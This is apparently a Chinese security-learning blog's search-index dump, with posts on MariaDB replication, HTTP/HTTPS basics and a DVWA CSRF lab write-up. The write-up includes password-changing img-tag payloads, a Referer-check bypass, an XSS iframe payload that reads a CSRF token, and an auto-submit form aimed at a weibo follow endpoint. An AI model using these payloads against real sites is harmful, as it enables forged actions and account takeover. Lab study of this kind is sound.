&#x27;1qaz@WSX&#x27;;</span><br></pre></td></tr></table></figure><p>记得要刷新权限表</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flush privileges;</span><br></pre></td></tr></table></figure><p>修改配置文件my.cnf,主1(192.168.11.201)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">server-id=1</span><br><span class="line">log-bin=mysql-bin</span><br><span class="line">binlog-do-db=test</span><br><span class="line">binlog-ignore-db=mysql</span><br><span class="line">log-slave-updates</span><br><span class="line">sync_binlog=1</span><br><span class="line">auto_increment_offset=1</span><br><span class="line">auto_increment_increment=2</span><br><span class="line">replicate-do-db=test</span><br><span class="line">replicate-ignore-db=mysql,information_schema</span><br></pre></td></tr></table></figure><p>修改配置文件my.cnf,主2(192.168.11.233)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">server-id=2</span><br><span class="line">log-bin=mysql-bin</span><br><span class="line">binlog-do-db=test</span><br><span class="line">binlog-ignore-db=mysql</span><br><span class="line">log-slave-updates</span><br><span class="line">sync_binlog=1</span><br><span class="line">auto_increment_offset=2</span><br><span class="line">auto_increment_increment=2</span><br><span class="line">replicate-do-db=test</span><br><span class="line">replicate-ignore-db=mysql,information_schema,performance_schema</span><br></pre></td></tr></table></figure><p>分别重启mariadb服务</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl restart mariadb</span><br></pre></td></tr></table></figure><p>分别检查查主1和主2作为主服务器的状态</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show master status\G;</span><br></pre></td></tr></table></figure><p>在主1上用change master to 指定同步位置</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">change master to master_host=&#x27;192.168.11.233&#x27;,master_user=&#x27;farmsec&#x27;,master_password=&#x27;1qaz@WSX&#x27;,master_log_file=&#x27;mysql-bin.000001&#x27;,master_log_pos=154;</span><br></pre></td></tr></table></figure><p>在主2上用change master to 指定同步位置</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">change master to master_host=&#x27;192.168.11.201&#x27;,master_user=&#x27;farmsec&#x27;,master_password=&#x27;1qaz@WSX&#x27;,master_log_file=&#x27;mysql-bin.000001&#x27;,master_log_pos=154;</span><br></pre></td></tr></table></figure><p>分别在主1和主2上重启从服务线程</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">start slave;</span><br></pre></td></tr></table></figure><p>分别在主1和主2上查看从服务器状态Slave_IO_Running与Slave_SQL_Running两项值均为Yes，即表示设置主主服务器成功。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show slave status\G</span><br></pre></td></tr></table></figure><p>在主1的test数据库创建一个表aaa</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use test;</span><br><span class="line">create table aaa(name int);</span><br></pre></td></tr></table></figure><p>在主2的test数据库中查看表名,存在aaa表就证明实验成功。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Burpsuite</title>
      <link href="/2024/05/25/BurpSuite/"/>
      <url>/2024/05/25/BurpSuite/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误！" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="ce2671569b5249a850492a0ef7653001ed349765711a81b8c384d448312c61cf"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">请输入密码查看</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Fiddler</title>
      <link href="/2024/05/25/Fiddler/"/>
      <url>/2024/05/25/Fiddler/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误！" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="dbfc1bb34214de1b1908affc99445686fc6649d985e899c5379a6a93e9710c07">4a2ebb5366b593a990d579a45ffbcba93f6b624856e5b2a627a928ce2cdf05c6d7e5c694aa5710246f894fe7e34d1e4736abdfa22646adec2ce6ba22b1fa57a5a41c4fd7a605a04b3b24ecc246c7ffbafd2dfa7ad7a1a7702493630370e561868df0d81fe4157211371a5745707c6334af13fe431bd6510592d565fc674e4822f26e3ec759d27f04f4afa0c0f67c71bbeb3a104dbdeca5b699f6e9f6afeda328321662dc5a51f8c0243253f6112bcae81ba7263c3cf4e175e06669d5818f1dc1c116315fb0200e49aed94fe68dad21bc0f5a00fab1308087b7ef3fd16b26c2d92450a77a568becca66394f6959a5c82e189a3fb6e3d81812143e587f76d09da675b88959744d67122ecd0b354befe10e9c06f4aa5e8c8b7cc41b75cc371d4757a80cdd0e7b74158991fd50bb04361a88c2c05c9d513acfee831b6b6d5d61b00ff0c42b2a56c41b69a254ee00066013afd58d451d1e7c890e1adbe05a704947517a0357e66102237dfbab1972f929d7cebfb9c6d8499d179c73fb0a2c1daf5cbaafd95b99f0537130789a6075573f862531a6a7cff551c287d3781b1dfcff197b799ae666c3411c9eef1503d7d5d591b064226912dcada3667cdc33f3a0ce2594328e02ec0a551aea72135c79a22c2d1b7058e956bf611a7663813c1f2fb39f798a8bc3566513beb15dfe86dccdfe96979d1afebcfd22ea524c437977e9f9936bd64fc2d58303ac8204de61ce9f98313e157ae6f644a771d135a4770f5c6f8f705dd94b5da51cac425cf438caa68796e40e1a05ea9ac1b6dc7eb872a34938b646b5d8cb9011a27ab383f62bef6097b544f350d21306d69caff5edd27e04f97dc2d074d4e06fd69c4221e2a1fc665ad0b06f42209100ec2276b477b08038a8468090622b962f8f60dc5c84c3925cfe114f4bf09549ece90cce17960fbeacebddf6bb0d46d32d1bea9936ad75cd8d4ef1c60bf21639a9813391cebec946cf0fbfe76b546f84aac15f171aae9cd02ee4faa9987e6e1e009af8a8dd5f6c10dc9e9101ea031d0f54a036ae9f3ce2e9e8ae8b31a3550f259fa6603cc9642abaf90e2d15341afd6e965e64a4baaedd6ba12c0c9a916aa20a3c31a557a546f667898003b34a0d579f8e934d25d3c1358a22a80a6eb70fb1d695da772e965b276a6e22dfc75ae685d365559795438c8fe71a295f79a27afb817bd947d9a27ed6b5648aee3569b63d641fbc6194e9477b8959be1022f52073838ad724c23fc774f6dd3b61410023c2baeed4596160066da5ff6cf8d6b5ffe45f52d8e72c17e688def41d386e3d3709a1cf29b0ff25a07efcf8f4a9243f2d0c3b5553e2e3212c9add6fafff64bba10349d15a7e1da5055f6179717599ef0a2792d79cc318fdf4000a1495ddc8e3ec2bbccc3697927d494972033608d1aabf33ba1100d6e182a5e95134b7e3dfa53f7b163f9118fabd2ef4b3260ce7a97bac7c429a6a745086fa90229d3f8562b2587f1a24e46de832e4c689486f1bd69b110596f9e82ddf418d9de858e5d02c6b71e143e5bb2a82eb174bafabcaf6749fdf2c9f81161c5a1ad19c29ad804652f5c3b36efc86f7d1e6d3e42d00d66415e0fc298c2d09bcd188e9f28d0545e8c57a47230ab8914d2d4d2c1575376f56ef6e50ef7dd7e690e58d4afd2cc6e1eadc63853b66fac20d9b1b722c3215ec9323e7ed35b6d670b2fb500d25ea6ef6bc47ba327ceff6fef49810c01b5cce9e7a56c73280a87fbf6537a971e8e91122d75ad898d4fc638ab15bb22485ceabd4d9a047ee962e913269d087206dae2737f9b4b5a89bc30533176a88bbc442b5b98ddccd71bed3d2031bf647d41aa6abc104de8363136b28e3116c1fd804ecf754493e54bb41164758fe51c2e8152f34fc816bfd76c24a73f90818f64b6eba4d03d969152c5d2912cab1eac68edb9cc7fa0cf0153d0727febd5c18d11c22d86ae5e3d7a2d955e7a6d8cce109d8485cdcc2c5e70201f6ec76afc6ebeebf83d34a72c423269815352f4c003a05da65b4706222a10e4c299741054ad5d86c1e22e339111ff857a79ee598b6fcd944e804a7000f3f2b615379db263a733f8a5b74b51333c27e929e43c1cd1f210bd4b293638065ddeafb8be28163d3f6ccfa2e14b11f20e21d129bd7c6142a83338bf590a392c30b4d83f6b2c5d7d9379284e5af5f297d45b294d73b1b98bc393990a8f9c103b7fa3e02e6fd09e62b99ab2f811042052e21</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">请输入密码查看</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTTP协议</title>
      <link href="/2024/05/25/HTTPS%E5%8D%8F%E8%AE%AE/"/>
      <url>/2024/05/25/HTTPS%E5%8D%8F%E8%AE%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="1-简介"><a href="#1-简介" class="headerlink" title="1 简介"></a>1 简介</h1><p><strong>超文本传输安全协议</strong>（英语：<strong>H</strong>yper<strong>T</strong>ext <strong>T</strong>ransfer <strong>P</strong>rotocol <strong>S</strong>ecure，缩写：<strong>HTTPS</strong>；常称为<code>HTTP over TLS</code>、<code>HTTP over SSL</code>或<code>HTTP Secure</code>）是一种通过计算机网络进行安全通信传输协议。<code>HTTPS</code>经由<code>HTTP</code>进行通信，但利用<code>SSL/TLS</code>来加密数据包。<code>HTTPS</code>开发的主要目的，是提供对网服务器的身份认证，保护交换资料的隐私与完整性。这个协议由网景公司（<code>Netscape</code>）在1994年首次提出，随后扩展到互联网上。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HTTPS=HTTP+SSL/TLS</span><br></pre></td></tr></table></figure><p>历史上，<code>HTTPS</code>连接经常用于万维网上的交易支付和企业信息系统中敏感信息的传输。在2000年代末至2010年代初，<code>HTTPS</code>开始广泛使用，以确保各类型的网页真实，保护账户和保持用户通信，身份和网络浏览的私密性。</p><p>另外，还有一种安全超文本传输协议（<code>S-HTTP</code>）的<code>HTTP</code>安全传输实现，但是<code>HTTPS</code>的广泛应用而成为事实上的<code>HTTP</code>安全传输实现，<code>S-HTTP</code>并没有得到广泛支持。</p><h1 id="2-认证方式"><a href="#2-认证方式" class="headerlink" title="2 认证方式"></a>2 认证方式</h1><img src="img/image-20220409202913534-9507355.png" style="zoom:80%;" />]]></content>
      
      
      
        <tags>
            
            <tag> 网络协议 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSRF漏洞</title>
      <link href="/2024/05/25/CSRF/"/>
      <url>/2024/05/25/CSRF/</url>
      
        <content type="html"><![CDATA[<h1 id="1-漏洞信息"><a href="#1-漏洞信息" class="headerlink" title="1 漏洞信息"></a>1 漏洞信息</h1><h2 id="1-1-漏洞简介"><a href="#1-1-漏洞简介" class="headerlink" title="1.1 漏洞简介"></a>1.1 漏洞简介</h2><p>CSRF ，全称 <code>Cross-site request forgery</code> ，翻译过来就是跨站请求伪造（客户端），是指利用受害者尚未失效的身份认证信息（<code>cookie</code> 、会话等），诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害者的身份向（身份认证信息所对应的）服务器发送请求，从而完成非法操作。 比如A银行的a用户，执行转账的操作是靠<code>http://xxx.com/xx.php?money=1000</code>向服务器发送一个get请求来执行的，那么如果在防御机制较差的情况下，攻击者b在恶意网站B的某个页面插入<code>&lt;img scr=&#39;http://xxx.com/xx.php?money=1000&#39; /&gt;</code>，并诱使a访问，那么a在访问恶意页面时实际就以自己的身份向银行服务器发送了一次转账请求，而服务器做出响应后，a用户即损失了1000RMB</p><h2 id="1-2-漏洞利用条件"><a href="#1-2-漏洞利用条件" class="headerlink" title="1.2 漏洞利用条件"></a>1.2 漏洞利用条件</h2><p>CSRF漏洞有两个关键条件，理解这两个条件可以帮助我们理解并防御CSRF漏洞： 服务端验证refer（简单来说就是判断用户从哪个页面来，如果发现A银行的转账请求是来自B网站的，就应该拒绝执行）机制不完善，导致另一个不可信站点的请求可以被服务器接收并返回相应数据。 服务端应该在每次用户执行敏感操作时（如更改密码），从服务端返回一个随机（术语称token）数给用户，用户请求时必须带上和服务端一致的token，否则拒绝执行。若没有采取token机制或token可预测，那么CSRF就变得容易利用。</p><p>CSRF首先是数据包<strong>可预测</strong>，可以被预测到请求的构造是怎么样的，这样才能构造恶意链接。</p><p><strong>XSS与CSRF的区别：</strong> XSS攻击的对象是浏览器，CSRF攻击的对象是用户未失效的会话。</p><p>CSRF利用流程： 攻击者发现CSRF漏洞–&gt;构造代码–&gt;发送给受害人–&gt;受害人打开–&gt;受害人执行代码–&gt;完成攻击</p><h1 id="2-漏洞实验"><a href="#2-漏洞实验" class="headerlink" title="2 漏洞实验"></a>2 漏洞实验</h1><h2 id="2-1-低级"><a href="#2-1-低级" class="headerlink" title="2.1 低级"></a>2.1 低级</h2><p>首先我们进入DVWA目标网站，用户名admin，密码 password,并将级别配置为low。 来到CSRF选项，执行一次正常的修改密码并进行观察。可以看到，更改密码的请求是直接放到url里的get请求。</p><p><img src="/img/20230619123515.png"></p><p>把请求包发到<strong>Repeater</strong>模块，可以看到返回的页面长度为4303。</p><p><img src="/img/20230619130848.png"></p><p>修改或删除<strong>Referer</strong>，返回的长度仍然是4303，说明网站没有对Referer做任何验证。</p><p><img src="/img/20230619131136.png"></p><p>在删除Referer这一行后，不要留有空行，否则会报错，get包不能有空行。</p><p><img src="/img/20230619131225.png"></p><p>经过上述的步骤验证的Referer，并且也没有在请求包中出现token，那么可以判断此处存在CSRF漏洞。</p><p>假如有人把<code>http://dvwa.com/vulnerabilities/csrf/?password_new=123456789&amp;password_conf=123456789&amp;Change=Change</code>这个恶意链接发给我，而且我的会话也未失效，当我在浏览器访问这个恶意链接时，就会立马修改我的密码。</p><p><img src="/img/20230619131949.png"></p><p><strong>构造恶意网站</strong></p><p>首先用小皮新建一个名为abc.com的网站，然后打开根目录，创建一个index.html文件，内容如下：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://dvwa.com/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>404 error<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/img/20230619134157.png"></p><p><img src="/img/20230619134237.png"></p><p>将网站链接发送给用户触发，我们会发现用户的密码被修改。 原理：如前面原理部分所说，html语言的<code>&lt;img&gt;</code>标签的src&#x3D;‘url’可以对url进行一次get请求。利用<code>&lt;img&gt;</code>标签来发送get请求是在很多场景下都会使用的小技巧，而对于一些如改密等敏感请求如果处理不当，只是简单的凭借get请求而不做其他一些验证，就容易被攻击者利用。</p><p><img src="/img/20230619134317.png"></p><p>利用burp创建恶意页面。右键——&gt;Engagement tools——&gt;Generate CSRF PoC。 </p><p><img src="/img/20230619135721.png"></p><p>复制生成的代码。</p><p><img src="/img/20230619140032.png"></p><p>把之前index.html的代码全部换成burp生成的代码。然后诱使用户点击恶意链接，然后点击发起更改密码请求的按钮。</p><p><img src="/img/20230619140521.png"></p><p>点击之后就会直接跳转到已被修改密码的界面了，如下图所示。</p><p><img src="/img/20230619140648.png"></p><h2 id="2-2-中级"><a href="#2-2-中级" class="headerlink" title="2.2 中级"></a>2.2 中级</h2><p><strong>分析改密请求的请求方式及规则</strong></p><p>把难度调成中级Medium，我们首先重复low等级的观察方式，发现url是和low等级一致的，然而重复low等级的漏洞复现却是失败的，我们需要看一下它的代码（代码注释中带有大致分析）</p><p><img src="/img/20230619190123.png"></p><p>可以看到，<code>Medium</code> 级别的代码检查了变量<code>HTTP_REFERER</code> （ <code>http</code> 包头的<code>Referer</code> 参数的值）中是否包含<code>SERVER_NAME</code> （ <code>http</code> 包头的 <code>Host</code>参数，及要访问的主机名，这里就是<code>dvwa.com</code>）。</p><p>这个规则并没有采用严格的正则表达式来检查，我们只是需要refer中包含主机名即可。那么如何包含主机名？</p><p>我们可以取文件名为主机名，其余步骤和<code>low</code>等级一致，这样就可以完美绕过<code>refer</code>验证。因为此时的<code>refer</code>变成了这样：<code>http://abc.com(恶意网站，在这里就是我们本机)/dvwa.com.html</code>。或者利用恶意网站的子域名，比如<code>http://dvwa.com.abc.com/index.html</code>。</p><p>如low等级所说，用户点击此页面，将发起一个改密get请求，这个请求自然是来自用户点击的<code>http://攻击者主机/dvwa.com.html</code>， 所以refer的值也就是<code>http://攻击者主机/dvwa.com.html</code>，  到这里，我们可以说，这种防御机制就被我们攻破了。</p><h2 id="2-3-高级"><a href="#2-3-高级" class="headerlink" title="2.3 高级"></a>2.3 高级</h2><p>这个漏洞需要借助dvwa的xss高级漏洞，实际情况直接把xss漏洞交上去就得了，这个CSRF拥有token，理论上来说是无法破解的，此处CSRF高级漏洞仅有演示意义，并无实际意义。</p><p><strong>漏洞利用</strong></p><p>本步骤将分析请求方式及规则 进行一次正常的改密请求，如下：</p><p>依旧是get请求，而请求中的参数包含了一个名为<code>user_token</code>的密文，这就是我们前面原理部分提到过的token机制，每一次改密请求token都是一个不可预测的随机数，low medium等级的方法显然不适用了，因为没有token，我们发出的请求就是无效的，而token是未知且难以预测的，从代码中也可以看出使用了token机制。</p><p><img src="/img/20230619191925.png"></p><p><img src="/img/20230619191840.png"></p><p>值得一提的是，如果你想用csrf去构造一个恶意页面用来偷取访问该页面的用户的token的话，我只能告诉你，你是不能成功的，这里牵扯到一个名为“跨域”的问题：</p><p>我们的要偷偷访问的地址是<code>http://192.168.0.192/dvwa/vulnerabilities/csrf</code> ，位于服务器 <code>192.168.0.192</code>上，而我们的攻击页面位于黑客服务器 <code>11.2.11.122</code>（假设）上，两者的域名不同，域名 B 下的所有页面都不允许主动获取域名 A 下的页面内容，除非域名 A 下的页面主动发送信息给域名 B 的页面，所以我们的域是不能主动获取目标域的信息的，只能等待目标域主动发送信息，而对于user_token之类的敏感信息，目标域是不会主动发送给我们的。所以我们的攻击脚本是不可能取到改密界面中的<code>user_token</code> 。 所以，进行到这里，我们判断：仅仅使用csrf是得不到用户token，也完成不了攻击的！</p><p>本步骤将利用xss绕过防御规则 这里需要利用到high 等级的xss漏洞来获取user_token，payload如下：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&#x27;../csrf&#x27;</span> <span class="attr">onload</span>=<span class="string">alert(frames[0].document.getElementsByName(</span>&#x27;<span class="attr">user_token</span>&#x27;)[<span class="attr">0</span>]<span class="attr">.value</span>)&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/img/20230619192119.png"></p><p>而获取user_token后，我们就可以重复low等级的步骤，只不过改变一下src里的利用代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;http://dvwa.com/vulnerabilities/csrf/?password_new=admin&amp;password_conf=admin&amp;Change=Change&amp;user_token=7b7e0b3095c54e250f3f9188b04862b5&quot;/&gt;</span><br></pre></td></tr></table></figure><p>此处<code>7b7e0b3095c54e250f3f9188b04862b5</code>为<code>xss</code>获取到的<code>token</code>，每一次刷新都在改变，请注意。</p><p><strong>注：</strong>形似<code>7b7e0b3095c54e250f3f9188b04862b5</code>的密文为服务端返回的<code>token</code>，对于防御机制较为完善的网站来说，用户要进行敏感操作如<code>支付</code>、<code>改密</code>等时，服务端会发给客户端一个随机数的响应，并且在服务端本身留下此随机数，用户进行敏感操作时必须带上此随机数，如果缺失或者随机数与服务端不匹配，就拒绝该请求。</p><p>接下来即可重复low等级步骤，建立html文档，诱使合法用户打开实现攻击（请注意！！当你xss弹框出来token时请不要返回csrf页面，因为在你点击csrf进入改密页面时token已经再次刷新！！这部分请严格跟着作者的步骤来）。</p><p>这种类型的CSRF危害没有GET型的大，利用起来通常使用的是一个自动提交的表单，如：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form id=&quot;csrf&quot; name=&quot;csrf&quot; action=&quot;http://photo.weibo.com/users/follow&quot; method=&quot;POST&quot;&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; name=&quot;uid&quot; value=&quot;1981622273&quot; /&gt;</span><br><span class="line">&lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    document.csrf.submit();</span><br><span class="line">&lt;/script&gt; </span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>CSRF需要出现在重要的位置才能构成危害。</p><p>CSRF需要受害者点击才能完成攻击过程。</p><p>CSRF需要受害者拥有cookie被攻击网站的COOKIE才可以，并且session未失效。</p><p>防御CSRF：token不能放在cookie里，要放在url参数中。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTTP协议</title>
      <link href="/2024/05/25/HTTP%E5%8D%8F%E8%AE%AE/"/>
      <url>/2024/05/25/HTTP%E5%8D%8F%E8%AE%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="1-概述"><a href="#1-概述" class="headerlink" title="1 概述"></a>1 概述</h1><p><strong>超文本传输协议</strong>（英语：<strong>H</strong>yper<strong>T</strong>ext <strong>T</strong>ransfer <strong>P</strong>rotocol，缩写：<strong>HTTP</strong>）。</p><p>设计<code>HTTP</code>最初的目的是为了提供一种发布和接收<code>HTML</code>（超文本标记语言）页面的方法。通过<code>HTTP</code>或者<code>HTTPS</code>协议请求的资源由统一资源标识符（Uniform Resource Identifiers，URI）来标识。</p><p><code>HTTP</code>的发展是由蒂姆·伯纳斯-李于1989年在欧洲核子研究组织（<code>CERN</code>）所发起。<code>HTTP</code>的标准制定由万维网协会（World Wide Web Consortium，<code>W3C</code>）和互联网工程任务组（Internet Engineering Task Force，<code>IETF</code>）进行协调，最终发布了一系列的<code>RFC</code>，其中最著名的是1999年6月公布的 RFC 2616，定义了<code>HTTP</code>协议中现今广泛使用的一个版本——<code>HTTP 1.1</code>。</p><p>2014年12月，互联网工程任务组（<code>IETF</code>）的Hypertext Transfer Protocol Bis（<code>httpbis</code>）工作小组将<code>HTTP/2</code>标准提议递交至<code>IESG</code>进行讨论，于2015年2月17日被批准。<code>HTTP/2标准</code>于2015年5月以<code>RFC 7540</code>正式发表，取代<code>HTTP 1.1</code>成为<code>HTTP</code>的实现标准。</p><p>1.0和2.0都少见，1.1最常见。</p><p>HTTP是一个应用层协议，由请求和响应构成，是一个标准的客户端服务器模型。HTTP是一个无状态的协议。 在Internet中所有的传输都是通过TCP&#x2F;IP进行的。HTTP协议作为TCP&#x2F;IP模型中应用层的协议也不例外。HTTP协议通 常承载于TCP协议之上，有时也承载于TLS或SSL协议层之上，这个时候，就成了我们常说的HTTPS。如下图所示：</p><p><img src="/img/image-20240522101119722.png" alt="image-20240522101119722"></p><p>HTTP默认的端口号为80，HTTPS的端口号为443。 浏览网页是HTTP的主要应用，但是这并不代表HTTP就只能应用于网页的浏览。HTTP是一种协议，只要通信的双方都 遵守这个协议，HTTP就能有用武之地。比如咱们常用的QQ，迅雷这些软件，都会使用HTTP协议(还包括其他的协议)。</p><h1 id="2-请求方法"><a href="#2-请求方法" class="headerlink" title="2 请求方法"></a>2 请求方法</h1><h2 id="GET"><a href="#GET" class="headerlink" title="GET"></a>GET</h2><p>GET方法请求一个指定资源的表示形式，使用GET的请求应该只被用于获取数据。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /books/?sex=man&amp;name=Professional HTTP/1.1</span><br><span class="line">Host: www.example.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.6)</span><br><span class="line">Gecko/20050225 Firefox/1.0.1</span><br><span class="line">Connection: Keep-Alive</span><br></pre></td></tr></table></figure><h2 id="HEAD"><a href="#HEAD" class="headerlink" title="HEAD"></a>HEAD</h2><p>HEAD方法请求一个与GET请求的响应相同的响应，但没有响应体。</p><p>GET是请求下来一个资源（会获取到），HEAD是确认服务器有没有这个资源，服务器告诉客户端有，但是不会给。</p><p>HEAD收到的包非常小，和适合做资源探测，比如一个网站明面上点不到的网页资源，目录扫描之类的，御剑就是用这个原理。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HEAD /admin HTTP/1.1</span><br><span class="line">Host: www.example.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.6)</span><br><span class="line">Gecko/20050225 Firefox/1.0.1</span><br><span class="line">Connection: Keep-Alive</span><br></pre></td></tr></table></figure><h2 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h2><p>POST方法用于将实体提交到指定的资源，通常导致在服务器上的状态变化或副作用。</p><p>登录、注册、留言、上传、修改资料等存在数据参与的，把数据提交到服务器表单的都是post请求。像这种数据量比较大的时候，就会用post请求，而不是利用url的get请求。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: www.example.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.6)</span><br><span class="line">Gecko/20050225 Firefox/1.0.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 40</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line"></span><br><span class="line">sex=man&amp;name=Professional</span><br></pre></td></tr></table></figure><h2 id="PUT"><a href="#PUT" class="headerlink" title="PUT"></a>PUT</h2><p>PUT方法用请求有效载荷替换目标资源的所有当前表示。</p><p>PUT和POST有点像，PUT是把自己的资源（如下1.txt）同步到服务器上，POST只是提交一个表单。</p><p>对于服务器来讲，PUT是一个极其危险的请求。</p><p>现在基本没有PUT漏洞了，IIS6.0有一个经典的PUT漏洞。</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">PUT</span> <span class="string">/1.txt</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>www.example.com</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.6)</span><br><span class="line">Gecko/20050225 Firefox/1.0.1</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>Keep-Alive</span><br></pre></td></tr></table></figure><h2 id="DELETE"><a href="#DELETE" class="headerlink" title="DELETE"></a>DELETE</h2><p>DELETE方法删除指定的资源。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DELETE /1.txt HTTP/1.1</span><br><span class="line">Host: www.example.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.6)</span><br><span class="line">Gecko/20050225 Firefox/1.0.1</span><br><span class="line">Connection: Keep-Alive</span><br></pre></td></tr></table></figure><h2 id="TRACE"><a href="#TRACE" class="headerlink" title="TRACE"></a>TRACE</h2><p>TRACE方法沿着到目标资源的路径执行一个消息环回测试。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TRACE /1.txt HTTP/1.1</span><br><span class="line">Host: www.example.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.6)</span><br><span class="line">Gecko/20050225 Firefox/1.0.1</span><br><span class="line">Connection: Keep-Alive</span><br></pre></td></tr></table></figure><h2 id="OPTIONS"><a href="#OPTIONS" class="headerlink" title="OPTIONS"></a>OPTIONS</h2><p>OPTIONS方法用于描述目标资源的通信选项。</p><p>给服务器发一个包，服务器告诉客户端它支持哪些协议</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">OPTIONS / HTTP/1.1</span><br><span class="line">Host: www.example.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.6)</span><br><span class="line">Gecko/20050225 Firefox/1.0.1</span><br><span class="line">Connection: Keep-Alive</span><br></pre></td></tr></table></figure><h2 id="CONNECT"><a href="#CONNECT" class="headerlink" title="CONNECT"></a>CONNECT</h2><p>CONNECT方法建立一个到由目标资源标识的服务器的隧道。</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CONNECT</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>www.example.com</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.6)</span><br><span class="line">Gecko/20050225 Firefox/1.0.1</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>Keep-Alive</span><br></pre></td></tr></table></figure><h2 id="GET和POST的区别"><a href="#GET和POST的区别" class="headerlink" 